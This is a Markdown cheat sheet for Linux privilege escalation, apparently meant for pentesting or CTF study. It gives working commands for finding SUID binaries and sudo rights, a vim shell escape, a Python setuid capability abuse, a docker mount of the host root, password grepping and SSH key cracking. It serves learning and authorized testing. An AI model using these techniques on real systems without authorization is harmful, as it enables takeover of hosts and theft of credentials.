# Linux Privilege Escalation

## Content
- Enumeration
- System Information
- User Enumeration
- Process Enumeration
- Network Enumeration
- File Permissions
- SUID
- Sudo Permissions
- Cron Jobs
- Linux Capabilities
- PATH Hijacking
- Environment Variables
- SSH Keys
- Credential Hunting
- NFS
- Docker
- LXC
- Kernel Exploits
- Services
- Scripts Analysis
- Tools

---

# 1. Enumeration

Gather information before exploiting anything:

```bash
whoami
id
hostname
uname -a
cat /etc/os-release
sudo -l
```

Check:
- OS version
- Current user privileges
- Groups
- Running services
- Network configuration

---

# 2. User Enumeration

Current user:

```bash
whoami
id
groups
```

Users:

```bash
cat /etc/passwd
```

Login history:

```bash
last
w
```

Look for:
- Users with shells
- Service accounts
- Interesting usernames

---

# 3. System Information

Kernel:

```bash
uname -r
uname -a
```

Search exploits:

```bash
searchsploit linux kernel <version>
```

Common vulnerabilities:
- DirtyCow
- DirtyPipe
- OverlayFS
- PwnKit

---

# 4. SUID

Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Alternative:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Useful binaries:

```
vim
find
nmap
python
bash
```

Reference:

https://gtfobins.github.io/

---

# 5. Sudo Permissions

Check sudo privileges:

```bash
sudo -l
```

Look for:
- NOPASSWD
- Vulnerable binaries
- Misconfigured permissions

Example:

```bash
sudo vim
```

Escape:

```vim
:!bash
```

---

# 6. Cron Jobs

Enumerate:

```bash
cat /etc/crontab
ls -la /etc/cron*
```

Search scripts:

```bash
find / -name "*.sh" 2>/dev/null
```

Look for:
- Root execution
- Writable scripts
- Weak permissions

---

# 7. Linux Capabilities

Find capabilities:

```bash
getcap -r / 2>/dev/null
```

Example:

```
python3 = cap_setuid+ep
```

Possible abuse:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

---

# 8. Weak Permissions

Writable files:

```bash
find / -writable -type f 2>/dev/null
```

Writable directories:

```bash
find / -writable -type d 2>/dev/null
```

Check:
- Root scripts
- Configuration files
- Service files

---

# 9. PATH Hijacking

Check PATH:

```bash
echo $PATH
```

Vulnerable example:

```bash
service apache restart
```

If the script does not use absolute paths, create a malicious binary with the same name.

---

# 10. Credential Hunting

Search passwords:

```bash
grep -R "password" /home 2>/dev/null
```

Search files:

```bash
find / -name "*.conf" 2>/dev/null
find / -name "*.env" 2>/dev/null
```

Interesting locations:

```
/home
/etc
/var/www
/opt
```

---

# 11. SSH Keys

Find keys:

```bash
find / -name id_rsa 2>/dev/null
```

Check permissions:

```bash
ls -la ~/.ssh/
```

Crack:

```bash
ssh2john id_rsa > hash.txt
john hash.txt
```

---

# 12. Docker

Check groups:

```bash
id
```

If docker access exists:

```bash
docker images
```

Privilege escalation:

```bash
docker run -v /:/mnt -it alpine chroot /mnt bash
```

---

# 13. NFS

Check exports:

```bash
cat /etc/exports
```

Dangerous:

```
no_root_squash
```

Enumerate:

```bash
showmount -e <IP>
```

---

# 14. Kernel Exploits

Check kernel:

```bash
uname -r
```

Search:

```bash
searchsploit linux kernel
```

Common:
- DirtyPipe
- DirtyCow
- OverlayFS

---

# 15. Enumeration Tools

## LinPEAS

```bash
./linpeas.sh
```

## Linux Exploit Suggester

```bash
./linux-exploit-suggester.sh
```

## Other tools

- pspy
- LSE
- GTFOBins
- ltrace
- strace

---

# Privilege Escalation Workflow

```
Enumeration
    |
System Information
    |
User Privileges
    |
SUID / Sudo
    |
Cron Jobs
    |
Capabilities
    |
Credentials
    |
Services
    |
Exploit
    |
Root Access
```

---

# References

- https://gtfobins.github.io/
- https://github.com/carlospolop/PEASS-ng
- https://github.com/DominicBreuker/pspy
